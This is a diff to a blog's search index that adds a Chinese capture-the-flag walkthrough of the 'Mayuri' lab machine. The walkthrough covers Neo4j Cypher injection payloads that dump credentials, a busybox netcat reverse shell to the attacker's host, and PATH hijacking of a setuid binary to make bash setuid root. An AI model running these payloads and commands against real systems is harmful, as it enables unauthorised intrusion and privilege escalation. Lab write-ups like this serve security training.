@@ -1,6 +1,93 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>MazeSec-Mayuri</title>
+    <url>/2025/08/12/MazeSec-Mayuri/</url>
+    <content><![CDATA[<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/mayuri]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -p- 192.168.0.103                                                                                                            </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 13:07 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.103</span><br><span class="line">Host is up (0.00058s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">MAC Address: 4A:94:24:32:EC:CF (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.38 seconds</span><br></pre></td></tr></table></figure>
+<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>开了80端口和8080端口，先访问一下80端口：</p>
+<p><img src="image1.png" alt="image1"></p>
+<p>说是要输入查询编号查询什么东西，看到“查询”两个字就想到可能会有注入，那就先来个引号试一下：</p>
+<p><img src="image2.png" alt="image2"></p>
+<p>果然报错了，但是报错的内容有点奇怪，有些问号，把这玩意扔给GPT问一下。</p>
+<p>GPT说这看起来像是 <strong>Neo4j Cypher</strong> 查询语句，正常的形式可能是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;MATCH (n:shop) WHERE n.sid = &#x27; + sid + &#x27; RETURN n;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这个报错看上去sid是直接拼接在查询语句中的，sid我们可控，因此可能存在注入。</p>
+<p>先看看8080端口是什么：</p>
+<p><img src="image5.png" alt="image5"></p>
+<p>8080端口是个登录页面，那可能就是要从80端口注入拿到账号密码，然后从8080端口进行登录。</p>
+<p>回到80端口，学习一下cypher的基本语法，并且发现cypher的注释符号是 <strong>&#x2F;&#x2F;</strong> ，那就可以用 “1 return n;&#x2F;&#x2F;” 和 “1’ return n;&#x2F;&#x2F;” 来试试是否存在注入：</p>
+<p><img src="image3.png" alt="image3"></p>
+<p><img src="image4.png" alt="image4"></p>
+<p>可以看到，<strong>1 return n;&#x2F;&#x2F;</strong> 可以正常返回查询sid为1的数据，说明存在数值类的注入。</p>
+<p>根据这篇文章<a href="https://blog.csdn.net/Che_ng/article/details/145965471">(https://blog.csdn.net/Che_ng&#x2F;article&#x2F;details&#x2F;145965471)</a>学习了一下cypher的语法，构造出了如下的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 return 1 as n union call db.labels() yield label as n return n;//</span><br></pre></td></tr></table></figure>
+
+<p>这个payload可以查询存在的所有标签，查看结果：</p>
+<p><img src="image6.png" alt="image6"></p>
+<p>发现有 <strong>User</strong> ，那就 <em>union</em> 继续拼接查询User的内容，payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 return n union match(n:User) return n;//</span><br></pre></td></tr></table></figure>
+
+<p><img src="image7.png" alt="image7"></p>
+<p>看到 <em>username</em> 为 <code>Okabe</code> , <em>password</em> 为 <code>OOOkkkaaabbbeee</code> ，拿去8080端口登录：</p>
+<p><img src="image8.png" alt="image8"></p>
+<p>进去之后有个终端，尝试 <code>ls</code> :</p>
+<p><img src="image9.png" alt="image9"></p>
+<p>是个可以执行命令的终端，那就进行反弹shell：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">busybox nc 192.168.0.104 1234 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h2 id="获取立足点"><a href="#获取立足点" class="headerlink" title="获取立足点"></a>获取立足点</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/mayuri]</span><br><span class="line">└─$ nc -nvlp 1234</span><br><span class="line">Listening on 0.0.0.0 1234</span><br><span class="line">Connection received on 192.168.0.102 48486</span><br><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">www-data@Mayuri:/var/www/website-b$ </span><br></pre></td></tr></table></figure>
+
+<p>在home里面，有个kyoma用户：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ww-data@Mayuri:/var/www/website-b$ <span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">www-data@Mayuri:/home$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">kyoma</span><br><span class="line">www-data@Mayuri:/home$</span><br></pre></td></tr></table></figure>
+
+<p>能够进入kyoma的家目录，不能执行 <code>ls</code> ，但是可以看user flag:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Mayuri:/home$ <span class="built_in">cd</span> kyoma</span><br><span class="line"><span class="built_in">cd</span> kyoma</span><br><span class="line">www-data@Mayuri:/home/kyoma$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span>: cannot open directory <span class="string">&#x27;.&#x27;</span>: Permission denied</span><br><span class="line">www-data@Mayuri:/home/kyoma$ <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">flag&#123;1.055821%&#125;</span><br><span class="line">www-data@Mayuri:/home/kyoma$ </span><br></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在机器里面寻找一些信息，在环境变量里面发现了一个密码：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Mayuri:/home/kyoma$ <span class="built_in">env</span></span><br><span class="line"><span class="built_in">env</span></span><br><span class="line">Pass=1.129848</span><br><span class="line">PWD=/home/kyoma</span><br><span class="line">APACHE_LOG_DIR=/var/log/apache2</span><br><span class="line">LANG=C</span><br><span class="line">INVOCATION_ID=0e54d57f5e424abfa9aecdf373228dd1</span><br><span class="line">APACHE_PID_FILE=/var/run/apache2/apache2.pid</span><br><span class="line">APACHE_RUN_GROUP=www-data</span><br><span class="line">APACHE_LOCK_DIR=/var/lock/apache2</span><br><span class="line">SHLVL=2</span><br><span class="line">LC_CTYPE=C.UTF-8</span><br><span class="line">APACHE_RUN_DIR=/var/run/apache2</span><br><span class="line">JOURNAL_STREAM=9:13641</span><br><span class="line">APACHE_RUN_USER=www-data</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">_=/usr/bin/env</span><br><span class="line">OLDPWD=/home</span><br><span class="line">www-data@Mayuri:/home/kyoma$</span><br></pre></td></tr></table></figure>
+
+<p>猜测是kyoma的密码，登录：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Mayuri:/home/kyoma$ su kyoma</span><br><span class="line">su kyoma</span><br><span class="line">Password: 1.129848</span><br><span class="line"></span><br><span class="line">kyoma@Mayuri:~$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">kyoma</span><br><span class="line">kyoma@Mayuri:~$ </span><br></pre></td></tr></table></figure>
+
+<p>在kyoma的家目录里面有一些文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kyoma@Mayuri:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">a.out  Mail  TimeMachine  user.txt</span><br><span class="line">kyoma@Mayuri:~$</span><br></pre></td></tr></table></figure>
+
+<p>有个Mail，查看内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">From: Okabe Rintarou &lt;phoenix.h@futuregadgetlab.net&gt;</span><br><span class="line">To: Okabe Rintarou &lt;o.rintarou@futuregadgetlab.net&gt;</span><br><span class="line">Subject: A Message to My Past Self</span><br><span class="line">Date: Mon, 15 Jul 2036 14:30:00 +0900</span><br><span class="line">Message-ID: &lt;f74c7678f9e61287e0719e59d9a10369@d-rine.sern.net&gt;</span><br><span class="line">X-Mailer: D-RINE (Amadeus Custom Build) v2.10</span><br><span class="line">X-Received-At: 2011-08-21 18:45:00 JST</span><br><span class="line"></span><br><span class="line">“看着吧，过去的我。”</span><br><span class="line">“世界是可以被欺骗的。”</span><br><span class="line">“将所有的可能性连接起来。”</span><br><span class="line">“欺骗世界，欺骗所有的时间轴观测者。”</span><br><span class="line">“这才是‘掌管未来的女神行动’。”</span><br><span class="line">“在那前方，有你的…”</span><br><span class="line">“你不是一个人。”</span><br><span class="line">“凤凰院凶真欺骗了世界。你也能做到。”</span><br><span class="line">“首先，你先需要通过时间机器拿到权限。”</span><br><span class="line">“El. Psy. Kongroo.”</span><br></pre></td></tr></table></figure>
+
+<p>他说 <strong>“你先需要通过时间机器拿到权限”</strong> ，我们现在是kyoba，那要拿的权限就应该是root权限了。</p>
+<p>说的时间机器应该就是家目录里的 <strong>TimeMachine</strong>，该文件信息如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kyoma@Mayuri:~$ file TimeMachine</span><br><span class="line">file TimeMachine</span><br><span class="line">TimeMachine: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e7dd04e54e42aa78b9d552e1822b91d8c29f7004, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br><span class="line">kyoma@Mayuri:~$ <span class="built_in">ls</span> -liah TimeMachine</span><br><span class="line"><span class="built_in">ls</span> -liah TimeMachine</span><br><span class="line">527418 -rwsr-xr-x 1 root root 17K Aug  6 07:35 TimeMachine</span><br><span class="line">kyoma@Mayuri:~$ </span><br></pre></td></tr></table></figure>
+
+<p>是ELF文件，有suid权限，而且我们有读和执行权限，把文件拿出来，放到IDA里面查看：</p>
+<p><img src="image10.png" alt="image10"></p>
+<p>其中的 <em>execute_chronos_query</em> 函数内容如下：</p>
+<p><img src="image11.png" alt="image11"></p>
+<p>看到它用 system 函数执行了 <em>dest</em> 这个字符串变量，<em>dest</em> 里面又是包含 <code>timedatectl | grep &#39;Local time&#39; | awk -F&#39;: &#39; &#39;</code> 这个命令，其中的 <code>timedatectl</code> 没有使用绝对路径，且程序里面没有初始化 <strong>PATH</strong> 环境变量，因此我们可以尝试进行命令劫持。</p>
+<p>在家目录下创建一个 <code>timedatectl</code> 文件，里面包含我们想要的提权命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kyoma@Mayuri:~$ <span class="built_in">echo</span> <span class="string">&#x27;chmod +s /bin/bash&#x27;</span> &gt;timedatectl</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;chmod +s /bin/bash&#x27;</span> &gt;timedatectl</span><br><span class="line">kyoma@Mayuri:~$ <span class="built_in">chmod</span> +x timedatectl</span><br><span class="line"><span class="built_in">chmod</span> +x timedatectl</span><br><span class="line">kyoma@Mayuri:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">a.out  Mail  timedatectl  TimeMachine  user.txt</span><br><span class="line">kyoma@Mayuri:~$ </span><br></pre></td></tr></table></figure>
+
+<p>修改 <strong>PATH</strong> :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kyoma@Mayuri:~$ <span class="built_in">export</span> PATH=/home/kyoma:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=/home/kyoma:<span class="variable">$PATH</span></span><br><span class="line">kyoma@Mayuri:~$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/home/kyoma:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">kyoma@Mayuri:~$</span><br></pre></td></tr></table></figure>
+
+<p>这时候如果运行TimeMachine，它使用的 <strong>timedatectl</strong> 命令应该就是我们放在家目录的那一个：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kyoma@Mayuri:~$ ./TimeMachine</span><br><span class="line">./TimeMachine</span><br><span class="line">==================================================</span><br><span class="line">=   世界线观测仪 v3.14 - AMADEUS 系统   =</span><br><span class="line">=      版权所有 2011, 未来道具研究所         =</span><br><span class="line">==================================================</span><br><span class="line"></span><br><span class="line">[系统] 初始化... 正在访问时序子系统。</span><br><span class="line">[自检] 验证命运石之眼校准... 正常。</span><br><span class="line">[自检] SERN 网络接口... 已激活。监视中...</span><br><span class="line"></span><br><span class="line">[警告] 时间跳跃机使用前需要充能。</span><br><span class="line">电话微波炉(暂定)充能中 [###################################] 100% (距离充能完毕:    0ms)</span><br><span class="line"></span><br><span class="line">[成功] 充能完毕。系统准备就绪。</span><br><span class="line"></span><br><span class="line">[成功] 正在向 IBN 5100 传输时序查询...</span><br><span class="line">--------------------------------------------------</span><br><span class="line">--------------------------------------------------</span><br><span class="line"></span><br><span class="line">操作完成。这一切都是命运石之门的选择。</span><br><span class="line">El. Psy. Kongroo.</span><br><span class="line">kyoma@Mayuri:~$ </span><br></pre></td></tr></table></figure>
+
+<p>查看 <strong>&#x2F;bin&#x2F;bash</strong> 的权限：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kyoma@Mayuri:~$ <span class="built_in">ls</span> -liah /bin/bash</span><br><span class="line"><span class="built_in">ls</span> -liah /bin/bash</span><br><span class="line">263242 -rwsr-sr-x 1 root root 1.2M Apr 18  2019 /bin/bash</span><br><span class="line">kyoma@Mayuri:~$ </span><br></pre></td></tr></table></figure>
+
+<p>可以看到已经有了s权限，用 <code>/bin/bash -p</code> 提权：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kyoma@Mayuri:~$ /bin/bash -p</span><br><span class="line">/bin/bash -p</span><br><span class="line">bash-5.0# <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">bash-5.0# </span><br></pre></td></tr></table></figure>
+
+<p>root flag：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash-5.0# <span class="built_in">cat</span> /root/root.txt</span><br><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br><span class="line">flag&#123;1.123581%&#125;</span><br><span class="line">bash-5.0# </span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>Maze-Sec</tag>
+        <tag>cypher</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MazeSec-Per1</title>
     <url>/2025/08/09/MazeSec-Per1/</url>
     <content><![CDATA[<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p- 192.168.0.107</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 00:31 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.107</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: E6:F4:83:79:2E:CF (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.38 seconds</span><br></pre></td></tr></table></figure>
@@ -82,27 +169,9 @@
 
 ]]></content>
       <tags>
+        <tag>Maze-Sec</tag>
         <tag>perl</tag>
         <tag>python</tag>
-        <tag>Maze-Sec</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2025/08/07/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
   </entry>
 </search>
